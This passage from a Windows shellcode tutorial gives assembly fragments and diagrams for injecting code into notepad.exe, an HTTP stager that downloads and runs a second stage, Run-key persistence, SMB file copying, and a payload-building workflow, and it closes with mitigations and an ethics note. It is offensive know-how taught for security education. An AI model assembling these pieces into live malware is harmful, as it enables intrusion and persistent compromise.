text-anchor="middle">0xC5</text><text x="340" y="238" fill="#cdd6f4" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0xC5 XOR 0xAA</text><text x="510" y="238" fill="#a6e3a1" font-family="Consolas,monospace" font-size="13" text-anchor="middle">0x6F = 'o'</text></svg></div>

*Figure 14.1 - Each iteration XORs one encoded byte back to its original value*

---

## 15. Process Injection -- Running In Another Process

**Process injection** transplants our code into a different, stable process. The seven-step chain: Snapshot, Enumerate, Find, Open, Allocate, Write, Execute.

### Finding the Target Process

```nasm
find_process:
    cmp  dword ptr [edi+0x24], 0x65746f6e ; "note"
    jne  next_process
    cmp  dword ptr [edi+0x28], 0x2e646170 ; "pad."
    jne  next_process
    ; Build "exe\0" via shift chain for null avoidance
    xor  eax, eax
    mov  al, 0x65
    shl  eax, 0x08
    mov  al, 0x78
    shl  eax, 0x08
    mov  al, 0x65                         ; EAX = 0x00657865
    cmp  dword ptr [edi+0x2c], eax
    jne  next_process
    jmp  found_explorer
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah15" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Process Injection Chain</text><rect x="30" y="55" width="140" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="100" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">1. Snapshot</text><text x="100" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">CreateToolhelp32</text><line x1="170" y1="77" x2="195" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="200" y="55" width="100" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="250" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">2. Enumerate</text><text x="250" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Process32Next</text><line x1="300" y1="77" x2="325" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="330" y="55" width="90" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="375" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">3. Find</text><text x="375" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">cmp DWORD</text><line x1="420" y1="77" x2="445" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="450" y="55" width="100" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="500" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">4. Open</text><text x="500" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">OpenProcess</text><line x1="550" y1="77" x2="575" y2="77" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="580" y="55" width="140" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="650" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">5. VirtualAllocEx</text><line x1="650" y1="100" x2="650" y2="130" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="400" y="135" width="160" height="45" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="480" y="158" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">6. WriteProcessMemory</text><line x1="480" y1="180" x2="480" y2="210" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah15)"/><rect x="400" y="215" width="160" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="480" y="238" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10" text-anchor="middle" font-weight="bold">7. CreateRemoteThread</text><text x="480" y="252" fill="#cdd6f4" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Code runs in target</text></svg></div>

*Figure 15.1 - The seven-step injection chain: from process snapshot to remote code execution*

---

## 16. HTTP Stager -- Downloading Second Stage

A stager writes a small first stage that downloads and executes a larger second stage from an HTTP server.

### The Read Loop

```nasm
read_loop:
    xor   eax, eax
    mov   [edi], eax                ; Reset bytesRead
    xor   ecx, ecx
    mov   cl, 0x10
    shl   ecx, 0x08                 ; ECX = 0x1000 (4096 bytes)
    push  edi                       ; &bytesRead
    push  ecx                       ; bytes to read
    push  dword ptr [ebp+0x34]      ; lpBuffer
    push  dword ptr [ebp+0x30]      ; hFile
    call  dword ptr [ebp+0x2C]      ; InternetReadFile
    mov   eax, [edi]
    add   [ebp+0x34], eax           ; Advance buffer pointer
    test  eax, eax
    jnz   read_loop                 ; Keep reading until done
```

Then `CreateThread` executes the downloaded code and `WaitForSingleObject` keeps the process alive.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah16" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">HTTP Stager Flow</text><rect x="30" y="55" width="140" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="100" y="80" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">LoadLibraryA</text><text x="100" y="94" fill="#fab387" font-family="Consolas,monospace" font-size="9" text-anchor="middle">("wininet.dll")</text><line x1="170" y1="80" x2="195" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="200" y="55" width="125" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="262" y="80" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">InternetOpenA</text><line x1="325" y1="80" x2="350" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="355" y="55" width="150" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="430" y="80" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">InternetOpenUrlA</text><line x1="505" y1="80" x2="530" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="535" y="55" width="180" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/><text x="625" y="75" fill="#f38ba8" font-family="Consolas,monospace" font-size="10" text-anchor="middle" font-weight="bold">InternetReadFile</text><text x="625" y="92" fill="#cdd6f4" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Loop until bytesRead = 0</text><line x1="625" y1="105" x2="625" y2="135" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah16)"/><rect x="535" y="140" width="180" height="45" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="625" y="162" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10" text-anchor="middle" font-weight="bold">CreateThread(baseAddr)</text><text x="625" y="178" fill="#cdd6f4" font-family="Consolas,monospace" font-size="9" text-anchor="middle">Execute downloaded shellcode</text><rect x="200" y="220" width="350" height="40" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="375" y="245" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11" text-anchor="middle">VirtualAlloc(RWX) holds the second stage in memory</text></svg></div>

*Figure 16.1 - Staged payload: first stage fetches second stage over HTTP, reads in a loop, then executes*

---

## 17. Registry Persistence -- Surviving Reboots

**Registry persistence** ensures our payload runs again after every reboot by writing to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

### Building the 12-DWORD Registry Path

```nasm
    xor   eax, eax
    push  eax                       ; Null terminator
    xor   eax, eax
    mov   al, 0x6e                  ; 'n'
    push  eax                       ; "n\0\0\0"
    push  0x75525c6e                ; "n\Ru"
    push  0x6f697372                ; "rsio"
    push  0x6556746e                ; "ntVe"
    push  0x65727275                ; "urre"
    push  0x435c7377                ; "ws\C"
    push  0x6f646e69                ; "indo"
    push  0x575c7466                ; "ft\W"
    push  0x6f736f72                ; "roso"
    push  0x63694d5c                ; "\Mic"
    push  0x65726177                ; "ware"
    push  0x74666f53                ; "Soft"
    mov   edi, esp
```

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="background:#1e1e2e;border-radius:8px"><defs><marker id="ah17" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><text x="375" y="30" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" text-anchor="middle" font-weight="bold">Registry Persistence Flow</text><rect x="40" y="55" width="160" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="120" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">LoadLibraryA</text><text x="120" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="10" text-anchor="middle">("advapi32.dll")</text><line x1="200" y1="80" x2="235" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah17)"/><rect x="240" y="55" width="170" height="50" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/><text x="325" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">RegOpenKeyExA</text><text x="325" y="92" fill="#fab387" font-family="Consolas,monospace" font-size="10" text-anchor="middle">(HKCU, Run key)</text><line x1="410" y1="80" x2="445" y2="80" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ah17)"/><rect x="450" y="55" width="170" height="50" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/><text x="535" y="78" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">RegSetValueExA</text><text x="535" y="92" fill="#f38ba8" font-family="Consolas,monospace" font-size="10" text-anchor="middle">("Updater", path)</text><rect x="200" y="140" width="350" height="50" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="375" y="160" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" text-anchor="middle">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</text><rect x="240" y="167" width="270" height="18" rx="3" fill="#1e1e2e" stroke="#89b4fa" stroke-width="0.5"/><text x="375" y="180" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10" text-anchor="middle">"Updater" = "C:\shell.exe"</text><text x="375" y="230" fill="#fab387" font-family="Consolas,monospace" font-size="11" text-anchor="middle">On next login: Windows runs C:\shell.exe</text></svg></div>

*Figure 17.1 - Registry persistence: open the Run key, write the payload path, reboot triggers execution*

With persistence and advanced injection behind us, the final sections cover file operations followed by a complete development workflow and closing thoughts.

---

## 18. SMB File Operations -- Network File Access

Our goal is to authenticate to a remote SMB share and copy a file -- all from position-independent assembly. We need **WNetAddConnection2A** from **mpr.dll** and **CopyFileA** from kernel32.

### Loading mpr.dll

```nasm
load_mpr_dll:
    xor   eax, eax
    push  eax                   ; Null terminator
    xor   eax, eax
    mov   ax, 0x6c6c
    shl   eax, 0x08
    mov   al, 0x64              ; EAX = 0x006c6c64 = "dll\0"
    push  eax
    push  0x2e72706d            ; "mpr."
    mov   esi, esp
    push  esi
    call  dword ptr [ebp+0x10]  ; LoadLibraryA("mpr.dll")
```

### NETRESOURCEA and CopyFileA

Build the 32-byte struct with `dwType = 1` (RESOURCETYPE_DISK) and `lpRemoteName` pointing to the UNC path on the stack. Then authenticate with `WNetAddConnection2A` and copy with `CopyFileA`.

<div align="center"><svg width="750" height="240" viewBox="0 0 750 240" xmlns="http://www.w3.org/2000/svg"><defs><marker id="ah18" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><rect width="750" height="240" rx="8" fill="#1e1e2e"/><text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" font-weight="bold">SMB File Copy Sequence</text><rect x="30" y="55" width="155" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="107" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">LoadLibraryA</text><text x="107" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">("mpr.dll")</text><line x1="185" y1="82" x2="225" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah18)"/><rect x="230" y="55" width="185" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="322" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">WNetAddConnection2A</text><text x="322" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">(&nr, pass, user, 0)</text><line x1="415" y1="82" x2="455" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah18)"/><rect x="460" y="55" width="155" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="537" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">CopyFileA</text><text x="537" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">(local, remote, FALSE)</text><rect x="220" y="145" width="310" height="40" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/><text x="375" y="170" text-anchor="middle" fill="#a6e3a1" font-family="Consolas,monospace" font-size="11">ExitProcess(0) -- Clean shutdown</text><text x="375" y="220" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="10" font-style="italic">Each arrow = stdcall: push args right-to-left, call, callee cleans stack</text></svg></div>

*Figure 18.1 - SMB file copy sequence: load DLL, authenticate, copy, exit*

---

## 19. File I/O -- Writing to Disk

Three kernel32 APIs: **CreateFileA**, **WriteFile**, **CloseHandle**.

### Null-Free Access Flag Construction

```nasm
    xor   ebx, ebx
    mov   bl,  0x03             ; EBX = 0x03
    shl   ebx, 30              ; EBX = 0xC0000000 = GENERIC_READ | GENERIC_WRITE
```

`0x03` shifted left by 30 bits puts the two set bits at positions 30 and 31 -- exactly `GENERIC_READ | GENERIC_WRITE`.

### Writing and Closing

```nasm
call_writefile:
    mov   ebx, eax              ; Save hFile
    ; Push message string as DWORDs, then:
    push  edi                   ; lpNumberOfBytesWritten
    push  0x1C                  ; 28 bytes
    push  esi                   ; lpBuffer
    push  ebx                   ; hFile
    call  dword ptr [ebp+0x1C] ; WriteFile

call_closehandle:
    push  ebx
    call  dword ptr [ebp+0x20] ; CloseHandle(hFile)
```

<div align="center"><svg width="750" height="200" viewBox="0 0 750 200" xmlns="http://www.w3.org/2000/svg"><defs><marker id="ah19" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#a6e3a1"/></marker></defs><rect width="750" height="200" rx="8" fill="#1e1e2e"/><text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="15" font-weight="bold">File I/O Sequence</text><rect x="30" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="120" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="12">CreateFileA</text><text x="120" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">0xC0000000 via shl</text><line x1="210" y1="82" x2="265" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah19)"/><rect x="270" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="360" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="12">WriteFile</text><text x="360" y="95" text-anchor="middle" fill="#fab387" font-family="Consolas,monospace" font-size="10">hFile, buf, len</text><line x1="450" y1="82" x2="505" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#ah19)"/><rect x="510" y="55" width="180" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/><text x="600" y="78" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="12">CloseHandle</text><text x="600" y="95" text-anchor="middle" fill="#a6e3a1" font-family="Consolas,monospace" font-size="10">Flush + release</text><text x="375" y="150" text-anchor="middle" fill="#cdd6f4" font-family="Consolas,monospace" font-size="11">TerminateProcess(-1, 0) -- clean exit via current process pseudo-handle</text></svg></div>

*Figure 19.1 - File I/O: create, write, close, terminate*

---

## 20. The Complete Development Workflow

Here is the end-to-end recipe for building any new shellcode payload from scratch.

**Step 1 -- Identify Required APIs.** Write the high-level logic in C pseudocode. List every Windows API and its DLL.

**Step 2 -- Compute ROR-13 Hashes.** Run each API name through the hash script. Double-check each hash.

**Step 3 -- Write the Skeleton.** Copy the reusable skeleton: `mov ebp, esp` / `add esp, 0xfffff9f0` / PEB walk / find_function.

**Step 4 -- Resolve APIs.** Push hash, call find_function, store at `[ebp+N]`. Keep a comment table mapping offsets to names.

**Step 5 -- Load Additional DLLs.** Call `LoadLibraryA`, swap base into EBX, resolve exports from the new DLL.

**Step 6 -- Build Payload Logic.** Construct strings and structs on the stack, push arguments right-to-left, call function pointers.

**Step 7 -- Eliminate Bad Characters.** Audit assembled bytes. Apply encoding patterns from Section 5.

**Step 8 -- Assemble and Test.** Keystone to assemble, bad char scanner to verify, ctypes harness to execute.

**Step 9 -- Debug in WinDbg.** Place `int3`, attach WinDbg, single-step, verify register values and stack layout.

**Step 10 -- Iterate.** Fix, reassemble, retest. Each cycle gets faster as your pattern library grows.

> **Pro tip:** Keep a personal library of tested building blocks: `find_kernel32`, `find_function`, string-push sequences for common DLL names, and the ctypes test harness. New payloads become an assembly job rather than a greenfield project.

---

## 21. Mitigations, Ethics, and Closing Thoughts

### Modern Defenses That Impact Shellcode

**DEP (Data Execution Prevention)** marks stack and heap memory as non-executable. Attackers must first use ROP to call `VirtualProtect` or `VirtualAlloc` to mark memory executable.

**ASLR (Address Space Layout Randomization)** randomizes DLL base addresses. Our PEB walk still works because it resolves at runtime, but the exploit's initial redirect (e.g., `jmp esp`) must defeat ASLR through an information leak or non-ASLR module.

**CFG (Control Flow Guard)** validates indirect call targets against a bitmap of legitimate function entry points.

**CET (Control-flow Enforcement Technology)** is Intel's hardware-level defense with a shadow stack that catches return address overwrites.

### Why This Matters for Defenders

When you see a suspicious memory region in a forensic dump, you can recognize the PEB walk pattern. When an EDR flags `VirtualAlloc` with RWX permissions, you understand why that is suspicious. When you write detection signatures, you can target structural patterns -- `fs:[0x30]`, the `ror edx, 0x0d` loop, `rep stosb` zero-fill -- rather than relying on fragile byte signatures.

Understanding the attacker's craft makes you a better defender. Full stop.

### A Note on Ethics

Every technique in this series is published for **authorized security testing and education only**. Always operate within the scope of a written authorization. Test only on systems you own or have explicit permission to test.

### Final Reflection

We started with a question: *what actually happens between the exploit and the payload?* Now you know. Shellcode is not magic. It is careful, patient engineering: finding a DLL by walking linked lists, matching function names by computing hashes, building data structures one DWORD at a time, and calling the same Windows APIs that every normal program uses -- just without the luxury of a compiler, a linker, or an import table.

The machine does not care whether instructions come from a `.exe` on disk or from a buffer in memory. It executes what it is told. Understanding that reality -- at the register level, at the byte level -- is what separates someone who *uses* tools from someone who *understands* them.

Go experiment. Modify the examples. The patterns you have learned are composable -- every new payload is a remix of the same building blocks.

The CPU is waiting. Go write something.

---

*Written by @Rem01x -- for educational purposes only.*
